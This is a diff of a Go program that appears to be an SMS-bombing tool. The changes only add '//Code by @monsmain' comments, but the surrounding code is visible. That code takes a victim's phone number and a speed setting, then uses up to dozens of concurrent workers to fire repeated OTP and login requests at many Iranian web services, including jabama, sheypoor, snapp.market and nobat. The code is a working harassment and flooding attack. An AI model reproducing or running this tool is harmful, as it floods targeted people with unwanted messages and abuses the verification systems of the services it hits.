@@ -17,7 +17,7 @@ import (
 	"syscall"
 	"time"    
 )
-
+//Code by @monsmain
 func clearScreen() {
 	cmd := exec.Command("clear")
 	if runtime.GOOS == "windows" {
@@ -40,7 +40,7 @@ func sendJSONRequest(ctx context.Context, url string, payload map[string]interfa
 			ch <- 0 
 			return
 		default:
-		}
+		}//Code by @monsmain
 
 		jsonData, err := json.Marshal(payload)
 		if err != nil {
@@ -92,7 +92,7 @@ func sendJSONRequest(ctx context.Context, url string, payload map[string]interfa
 		return 
 	}
 }
-
+//Code by @monsmain
 func sendFormRequest(ctx context.Context, url string, formData url.Values, wg *sync.WaitGroup, ch chan<- int) {
 	defer wg.Done()
 
@@ -202,7 +202,7 @@ func sendGETRequest(ctx context.Context, url string, wg *sync.WaitGroup, ch chan
 		resp.Body.Close()
 		return 
 	}
-}
+}//Code by @monsmain
 func getPhoneNumberNoZero(phone string) string {
 	if strings.HasPrefix(phone, "0") {
 		return phone[1:]
@@ -279,7 +279,7 @@ func main() {
 	fmt.Scan(&speedChoice)
 
 	var numWorkers int 
-
+//Code by @monsmain
 	switch strings.ToLower(speedChoice) { 
 	case "fast":
 
@@ -293,7 +293,7 @@ func main() {
 
 		numWorkers = 30 
 		fmt.Println("\033[01;31m[-] Invalid speed choice. Defaulting to medium mode using", numWorkers, "workers.\033[0m")
-	}
+	}//Code by @monsmain
 
 
 	ctx, cancel := context.WithCancel(context.Background())
@@ -348,7 +348,7 @@ func main() {
 			sendJSONRequest(ctx, "https://poltalk.me/api/v1/auth/phone", map[string]interface{}{
 				"phone": phone,
 			}, &wg, ch)
-		}
+		}//Code by @monsmain
 		// https://refahtea.ir/wp-admin/admin-ajax.php (Form Data)
 		wg.Add(1)
 		tasks <- func() {
@@ -391,7 +391,7 @@ func main() {
 			sendJSONRequest(ctx, "https://www.irantic.com/api/login/authenticate", map[string]interface{}{
 				"mobile": phone, 
 			}, &wg, ch)
-		}
+		}//Code by @monsmain
 			// gifkart.com (SMS - POST Form)
 			wg.Add(1)
 			tasks <- func() {
@@ -484,7 +484,7 @@ func main() {
 				formData.Set("json", "1")
 				formData.Set("whatsapp", "0")
 				sendFormRequest(ctx, "https://pgemshop.com/wp-admin/admin-ajax.php", formData, &wg, ch)
-			}
+			}//Code by @monsmain
 			// api.cafebazaar.ir (POST JSON)
 			wg.Add(1)
 			tasks <- func() {
@@ -532,7 +532,7 @@ func main() {
         formData.Set("use_emta_v2", "yes")
         formData.Set("domain", "nobat")
         sendFormRequest(ctx, "https://api.nobat.ir/patient/login/phone", formData, &wg, ch)
-    }
+    }//Code by @monsmain
     // snapp.market
      wg.Add(1)
     tasks <- func() {
@@ -580,7 +580,7 @@ func main() {
 				"cellphone":    phone,
 				"country_code": "98",
 			}, &wg, ch)
-		}
+		}//Code by @monsmain
 // bigtoys.ir - Variation 3 (Form)
 		wg.Add(1)
 		tasks <- func() {
@@ -691,7 +691,7 @@ func main() {
 				"method":     "phone",
 				"identifier": phone,
 			}, &wg, ch)
-		}
+		}//Code by @monsmain
 		// virgool.io (JSON)
 		wg.Add(1)
 		tasks <- func() {
@@ -805,7 +805,7 @@ func main() {
 			sendJSONRequest(ctx, "https://gw.jabama.com/api/v4/account/send-code", map[string]interface{}{
 				"mobile": phone,
 			}, &wg, ch)
-		}
+		}//Code by @monsmain
 		wg.Add(1) // jabama.com (JSON) - taraazws
 		tasks <- func() {
 			sendJSONRequest(ctx, "https://taraazws.jabama.com/api/v4/account/send-code", map[string]interface{}{
@@ -817,7 +817,7 @@ func main() {
 			sendJSONRequest(ctx, "https://api.torobpay.com/user/v1/login/", map[string]interface{}{
 				"phone_number": phone,
 			}, &wg, ch)
-		}
+		}//Code by @monsmain
 		wg.Add(1) // sheypoor.com (JSON)
 		tasks <- func() {
 			sendJSONRequest(ctx, "https://www.sheypoor.com/api/v10.0.0/auth/send", map[string]interface{}{
@@ -889,7 +889,7 @@ func main() {
 			sendJSONRequest(ctx, "https://api.komodaa.com/api/v2.6/loginRC/request", map[string]interface{}{
 				"phone_number": phone,
 			}, &wg, ch)
-		}
+		}//Code by @monsmain
 		wg.Add(1) // anargift.com auth (JSON)
 		tasks <- func() {
 			sendJSONRequest(ctx, "https://ssr.anargift.com/api/v1/auth", map[string]interface{}{
@@ -938,7 +938,7 @@ func main() {
 			sendJSONRequest(ctx, "https://auth.basalam.com/captcha/otp-request", map[string]interface{}{
 				"mobile": phone,
 			}, &wg, ch)
-		}
+		}//Code by @monsmain
 		wg.Add(1) // drnext.ir (JSON)
 		tasks <- func() {
 			sendJSONRequest(ctx, "https://cyclops.drnext.ir/v1/patients/auth/send-verification-token", map[string]interface{}{
@@ -970,7 +970,7 @@ func main() {
 			}, &wg, ch)
 		}
 	}
-
+//Code by @monsmain
 	close(tasks)
 
 	go func() {
@@ -986,3 +986,4 @@ func main() {
 		}
 	}
 }
+//Code by @monsmain
